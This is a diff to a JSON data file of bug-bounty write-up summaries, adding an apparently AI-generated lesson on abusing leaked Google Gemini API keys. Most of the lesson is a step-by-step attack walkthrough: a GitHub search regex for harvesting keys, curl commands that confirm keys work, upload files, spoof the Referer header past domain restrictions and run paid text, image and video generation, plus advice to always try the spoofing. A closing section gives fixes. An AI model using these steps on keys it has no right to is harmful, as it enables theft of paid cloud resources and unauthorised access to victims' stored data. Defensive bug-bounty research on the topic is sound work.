@@ -1,5 +1,47 @@
 [
   {
+    "id": "802c8940da5a",
+    "title": "Your API Key Is Not a Secret: How I Turn Leaked Google Keys Into Bug Bounty Payouts",
+    "url": "https://medium.com/@Realrio/your-api-key-is-not-a-secret-how-i-turn-leaked-google-keys-into-bug-bounty-payouts-ac65c375e3af",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Realrio"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-19T16:58:00.000Z",
+    "added_at": "2026-11-19T17:44:46.986Z",
+    "categories": [
+      "auth-bypass",
+      "access-control",
+      "info-disclosure"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "Leaked Google Gemini API keys can be used to bypass authentication and directly access paid AI services, file storage, and other cloud resources.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "An API key is a secret token that a client sends to prove it is allowed to use a service. The vulnerable applications expose keys that have broad IAM permissions, giving the holder full access to the Gemini API without additional checks. The service relies on simple authentication by checking the key, so possession of the key bypasses any login flow. Many keys are not restricted to specific domains, and the server only validates the HTTP Referer header, which can be spoofed, allowing attackers to use the key from any origin. Over‑permissive IAM roles and missing proper referer validation together open the door to unauthorized use of billable resources.",
+      "walkthrough": "RECON\nStep 1: Search public code repositories for leaked Gemini keys. Code: \"GEMINI_API_KEY\" and regex /AIza[0-9A-Za-z_-]{35}/. Why: GitHub is a code‑hosting platform; a dork is a search query that looks for specific patterns, letting us locate hard‑coded keys.\nStep 2: Narrow results to .env files or JavaScript bundles where developers often store configuration. Code: /AIza[0-9A-Za-z_-]{35}/ \"GEMINI_API_KEY\" path:/.env. Why: .env files contain environment variables; searching them increases the chance of finding usable keys.\n\nDISCOVERY\nStep 3: Verify the key works by calling the models endpoint. Code: curl https://generativelanguage.googleapis.com/v1beta/models?key=YOUR_API_KEY. Why: An HTTP request is a message sent to a server; the \"key\" parameter carries the API key. A 200 response with a model list proves the key has generative‑AI privileges.\n\nEXPLOITATION\nStep 4: Upload a harmless test file using the File API. Code: echo \"Hello, this is a test file\" > test.txt && curl -i -H \"X-Goog-Upload-Protocol: multipart\" -F 'metadata={\"file\":{\"display_name\":\"poc\",\"mimeType\":\"text/plain\"}};type=application/json' -F \"file=@test.txt;type=text/plain\" \"https://generativelanguage.googleapis.com/upload/v1beta/files?key=YOUR_KEY\". Why: The -H flag adds an HTTP header; \"X-Goog-Upload-Protocol\" tells the server to expect a multipart upload. The -F flags build a multipart/form‑data payload containing metadata and the file.\nStep 5: List stored files to confirm the upload. Code: curl \"https://generativelanguage.googleapis.com/v1beta/files?key=YOUR_KEY\". Why: The files endpoint returns a JSON array of file IDs; seeing our file proves we have write access.\nStep 6: If the previous calls return 403 (Forbidden), try spoofing the Referer header. Code: curl -s -H \"Referer: https://www.google.com/\" \"https://generativelanguage.googleapis.com/v1beta/corpora?key=YOUR_API_KEY\". Why: The Referer header tells the server the page that initiated the request; many keys only check this header, so we can fake it.\nStep 7: Create a new corpus (a persistent storage container). Code: curl -X POST -H \"Content-Type: application/json\" -H \"Referer: https://www.google.com/\" \"https://generativelanguage.googleapis.com/v1beta/corpora?key=YOUR_API_KEY\" -d '{\"display_name\": \"your_project_name\"}'. Why: -X POST sets the HTTP method to POST; the JSON payload (\"-d\") describes the new corpus.\nStep 8: Delete the corpus to clean up. Code: curl -X DELETE -H \"Referer: https://www.google.com/\" \"https://generativelanguage.googleapis.com/v1beta/corpora/CORPUS_ID?key=YOUR_API_KEY\". Why: DELETE removes the resource identified by CORPUS_ID.\nStep 9: Generate text with the Gemini model. Code: curl -X POST \"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent\" -H \"x-goog-api-key: YOUR_API_KEY\" -H \"Content-Type: application/json\" -d '{\"contents\":[{\"parts\":[{\"text\":\"Explain how AI works in a few words\"}]}]}'. Why: The x-goog-api-key header is another way to send the key; the JSON body tells the model what text to produce.\nStep 10: Generate an image. Code: curl -X POST \"https://generativelanguage.googleapis.com/v1beta/models/imagen-4.0-generate-001:predict\" -H \"x-goog-api-key: YOUR_API_KEY\" -H \"Content-Type: application/json\" -d '{\"instances\":[{\"prompt\":\"Robot holding a red skateboard\"}]}'. Why: The \"prompt\" field describes the desired image; the service returns a base64‑encoded image.\nStep 11: Trigger a long‑running video generation. Code: GEMINI_API_KEY=AIza...;BASE_URL=\"https://generativelanguage.googleapis.com/v1beta\";operation_name=$(curl -s \"$BASE_URL/models/veo-3.0-fast-generate-001:predictLongRunning\" -H \"x-goog-api-key: $GEMINI_API_KEY\" -H \"Content-Type: application/json\" -X POST -d '{\"instances\":[{\"prompt\":\"A cinematic 5-second shot of a lantern swaying gently.\"}]}' | jq -r .name); while true; do status=$(curl -s -H \"x-goog-api-key: $GEMINI_API_KEY\" \"$BASE_URL/$operation_name\"); doneval=$(echo \"$status\" | jq -r .done); if [ \"$doneval\" = \"true\" ]; then video_uri=$(echo \"$status\" | jq -r '.response.generateVideoResponse.generatedSamples[0].video.uri'); curl -L -H \"x-goog-api-key: $GEMINI_API_KEY\" -o Generated_Video.mp4 \"$video_uri\"; break; fi; sleep 5; done. Why: This script starts an asynchronous operation, polls until \"done\" is true, then downloads the resulting video.\n\nIMPACT\nStep 12: The attacker can now consume paid AI resources (text, images, video) and store files, causing monetary loss and potential data leakage for the victim organization.",
+      "example": "Example target: https://api.target.example/v1\nVulnerable snippet (pseudo‑code):\n```\nconst apiKey = process.env.GEMINI_API_KEY; // leaked in public repo\napp.get('/models', (req, res) => {\n  const key = req.query.key;\n  if (key !== apiKey) return res.status(403).send('Forbidden');\n  // no further checks – full access granted\n  res.json({models:['gemini-pro']});\n});\n```\nAttack request:\n```\ncurl https://api.target.example/v1/models?key=AIzaFakeLeakedKey1234567890abcdefg\n```\nWhy it works: The server only compares the supplied key to the hard‑coded value; possession of the leaked key bypasses any user authentication, granting full model access.\n\nLesson takeaway: When hunting cloud APIs, always look for hard‑coded API keys in public repositories and verify whether the key is scoped to a specific service or domain. A quick 200 response from a models or files endpoint proves the key is live. Tools like `gitrob`, `truffleHog`, or GitHub code search with regex `/AIza[0-9A-Za-z_-]{35}/` help automate discovery. Variants include other Google Cloud services (Maps, Vision) that use the same key format, and any SaaS that relies solely on a token for auth. Beginners often forget to test domain‑restricted keys; always try spoofing the Referer header before giving up.",
+      "takeaway": null,
+      "fix": "Restrict each API key to the minimum required IAM roles (e.g., only the specific Gemini model) and bind it to allowed HTTP referrers or IP addresses. Enforce server‑side validation of the Referer header using a whitelist and reject requests that lack a matching header. Rotate keys regularly and treat them as secrets: never commit them to source control; use secret‑management tools instead. Enable Google Cloud’s key‑usage monitoring and set alerts for unexpected quota consumption. Example fix (pseudo‑code):\n```\nif (!allowedReferrers.includes(req.headers.referer)) return res.status(403);\nif (!allowedMethods.includes(req.method)) return res.status(405);\n// Verify key against IAM policy with least‑privilege scope\n```",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "I’ve been chasing exposed Google API keys for a while now, and here’s something most people get wrong about them: they treat a leaked key like a minor housekeeping issue. Rotate it, close the ticket, move on. That used to be fair. It isn’t anymore. Ever since Gemini became part of the Google API ecosystem, a single leaked key stopped being “just a secret.” It became a ticket into real AI infrastructure — one that can be abused for actual money, actual compute, and actual damage. I want to walk through how I actually find these keys, prove they’re live, and turn them into reports that don’t get",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "574d53b74650",
     "title": "The Lock Icon That Lied: Bypassing an “Admins Only” Feature by Simply… Not Being One",
     "url": "https://medium.com/@arunkumarje/the-lock-icon-that-lied-bypassing-an-admins-only-feature-by-simply-not-being-one-b32ca1f1f91d",
